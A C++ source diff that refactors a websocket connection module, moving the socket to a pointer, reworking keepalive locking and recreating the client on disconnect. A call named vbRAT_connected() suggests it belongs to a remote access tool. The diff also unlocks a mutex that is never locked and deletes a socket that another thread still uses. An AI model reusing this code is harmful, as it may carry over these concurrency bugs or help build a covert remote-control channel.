@@ -28,7 +28,7 @@ typedef struct {
     pthread_t keepAliveT;
     pthread_t mainT;
     vbConnection_state state = S_TOINIZIALIZE;
-    WebsocketsClient socket;
+    WebsocketsClient *socket;
     vbConnection_onEvent onConnectedCB = NULL;
     vbConnection_onEvent onDisconnectedCB = NULL;
     vbConnection_onReceived onMessageCB = NULL;
@@ -74,6 +74,7 @@ int32_t vbConnection_Connect(const char *address)
             pthread_mutex_unlock(&vbConnection.socketLock);
             stateChange(S_INIT);
             snprintf(vbConnection.server_address, SERVER_ADDRESS_MAX_LEN, "%s", address);
+            vbConnection.socket = new WebsocketsClient();
             pthread_create(&vbConnection.mainT, NULL, (void *(*)(void *)) connectionMainThread,
                            NULL);
             vbConnection.init = true;
@@ -127,15 +128,13 @@ void keepAliveThread(WebsocketsClient *cli)
     {
         if(vbConnection_getState()==255)
             pthread_exit(0);
-        if(cli->available())
+        pthread_mutex_lock(&vbConnection.socketLock);
         {
-            pthread_mutex_lock(&vbConnection.socketLock);
-            {
-                //send something in order to keep the connection open
-                vbConnection.socket.send("~p");
-            }
-            pthread_mutex_unlock(&vbConnection.socketLock);
+            if(vbConnection_getState()==S_CONNECTED) //yes we might have been locked for a while, so we need to double check about the state
+            if (cli->available())
+                vbConnection.socket->send("~p");                //send something in order to keep the connection open
         }
+        pthread_mutex_unlock(&vbConnection.socketLock);
         sleep(10);
     }
 }
@@ -172,9 +171,9 @@ void onEventsCallback(WebsocketsEvent event, std::string data) {
     if (event == WebsocketsEvent::ConnectionOpened)
     {
 
-//        vbConnection.socket.send("~connected");
+//        vbConnection.socket->send("~connected");
         pthread_create(&vbConnection.keepAliveT, NULL,
-                       (void *(*)(void *)) keepAliveThread, &vbConnection.socket);
+                       (void *(*)(void *)) keepAliveThread, vbConnection.socket);
         //vbConnection.onConnectedCB();
         vbRAT_connected();
 
@@ -187,7 +186,7 @@ void onEventsCallback(WebsocketsEvent event, std::string data) {
 vbConnection_error vbConnection_Send(const char *msg)
 {
     pthread_mutex_lock(&vbConnection.socketLock);
-    vbConnection.socket.send(msg);
+    vbConnection.socket->send(msg);
     pthread_mutex_unlock(&vbConnection.socketLock);
     return NO_ERRORS;
 }
@@ -197,28 +196,30 @@ void* connectionMainThread() {
         switch (vbConnection.state)
         {
             case S_INIT:
-                vbConnection.socket.onMessage(onMessageCallback);
-                vbConnection.socket.onEvent(onEventsCallback);
-                if(vbConnection.socket.connect(vbConnection.server_address))
+                vbConnection.socket->onMessage(onMessageCallback);
+                vbConnection.socket->onEvent(onEventsCallback);
+                if(vbConnection.socket->connect(vbConnection.server_address))
                     stateChange(S_CONNECTING);
                 else
                     errorSet(ERR_CANNOT_CONNECT);
                 break;
             case S_RECONNCTING:
             case S_CONNECTING:
-                if (vbConnection.socket.available())
+                if (vbConnection.socket->available())
                     stateChange(S_CONNECTED);
                 break;
             case S_CONNECTED:
                 //pthread_mutex_lock(&vbConnection.socketLock);
-                if (vbConnection.socket.available())
-                    vbConnection.socket.poll();
+                if (vbConnection.socket->available())
+                    vbConnection.socket->poll();
                 else
                     stateChange(S_DISCONNECTED);
-                //pthread_mutex_unlock(&vbConnection.socketLock);
+                pthread_mutex_unlock(&vbConnection.socketLock);
                 break;
             case S_DISCONNECTED:
-                vbConnection.socket.connect(vbConnection.server_address);
+                delete vbConnection.socket;
+                vbConnection.socket = new WebsocketsClient();
+                vbConnection.socket->connect(vbConnection.server_address);
                 stateChange(S_RECONNCTING);
                 break;
             case S_ERROR:
